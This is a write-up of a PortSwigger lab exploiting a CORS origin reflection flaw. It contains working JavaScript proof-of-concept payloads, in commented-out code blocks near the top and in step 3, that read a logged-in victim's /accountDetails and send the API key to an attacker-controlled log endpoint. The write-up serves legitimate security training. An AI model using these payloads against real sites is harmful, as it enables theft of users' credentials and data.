# Writeup for PortSwigger CORS Lab: Basic Origin Reflection Attack

<!-- ## PoC Code That Worked
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'https://0a8e00b303ea0933845429a900d2001b.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = '/log?key=' + this.responseText;
    };
</script>
```

## Initial PoC That Did Not Work
```html
<html>
<body>
    <script>
        var xhr = new XMLHttpRequest();
        var url = "https://0a8e00b303ea0933845429a900d2001b.web-security-academy.net";

        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                fetch("/log?key=" + xhr.responseText);
            }
        }

        xhr.open("GET", url + "/accountDetails", true);
        xhr.withCredentials = true;
        xhr.send(null);
    </script>
</body>
</html>
``` -->

## Steps Followed to Solve the Lab

1. **Initial Reconnaissance**:
   - Turned off Burp intercept and logged into the lab using the provided credentials.
   - Navigated to the account page and noted that the API key was retrieved using an AJAX request to `/accountDetails`.
   - Observed that the server responded with an `Access-Control-Allow-Credentials` header, indicating potential CORS misconfiguration.

2. **Testing Origin Reflection**:
   - Sent the `/accountDetails` request to Burp Repeater.
   - Added the following header to the request:
     ```
     Origin: https://example.com
     ```
   - Observed that the server reflected the origin in the `Access-Control-Allow-Origin` header, confirming that the server was vulnerable to an origin reflection attack.

3. **Creating and Testing the Exploit**:
   - Navigated to the exploit server and entered the following HTML payload, replacing `YOUR-LAB-ID` with the unique lab ID:
    <!-- ```html
     <script>
         var req = new XMLHttpRequest();
         req.onload = reqListener;
         req.open('get', 'YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
         req.withCredentials = true;
         req.send();

         function reqListener() {
             location = '/log?key=' + this.responseText;
         };
     </script>
     ```-->
   ![Basic Origin Reflection Attack Lab 1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab1c.PNG)
   
   - Clicked **View exploit** to test the payload.
   - Verified that the exploit worked by landing on the log page, with the API key included in the URL.

5. **Delivering the Exploit**:
   - Returned to the exploit server and clicked **Deliver exploit to victim**.

6. **Retrieving the Victim's API Key**:
   - Clicked **Access log** on the exploit server.
   - Retrieved the victim's API key from the logs and submitted it to complete the lab.

## Observations
- The working PoC leveraged the server’s misconfigured CORS policy to exfiltrate the victim’s API key.
- The key difference between the failed and successful PoCs was the incorrect concatenation in the URL of the initial attempt.

## Conclusion
This lab demonstrated how to exploit a CORS origin reflection vulnerability using an XMLHttpRequest with the `withCredentials` flag enabled. Proper CORS configuration is essential to prevent such attacks.

![Basic Origin Reflection Attack Lab 1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab1a.PNG)

The Admin's API Key is highlighted

![Basic Origin Reflection Attack Lab 1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab1b.PNG)


Initial PoC That Did Not Work from Rana Khalil Tutorials
![Basic Origin Reflection Attack Lab 1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab1d.PNG)
